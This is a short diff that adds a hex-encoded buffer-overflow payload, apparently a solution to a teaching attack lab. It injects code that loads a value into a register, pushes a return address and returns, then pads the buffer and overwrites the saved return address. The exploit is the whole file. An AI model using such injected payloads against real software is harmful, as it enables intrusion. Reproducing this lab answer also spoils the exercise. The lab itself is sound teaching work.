@@ -1,0 +1,13 @@
+/* Exploit code */
+48 c7 c7 0e 66 21 5d    /* mov    $0x5d21660e,%rdi */
+68 cc 26 40 00          /* pushq  $0x4026cc */
+c3                      /* retq */
+
+/* Padding */
+00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Address of our exploit code */
+88 92 60 55 00 00 00 00
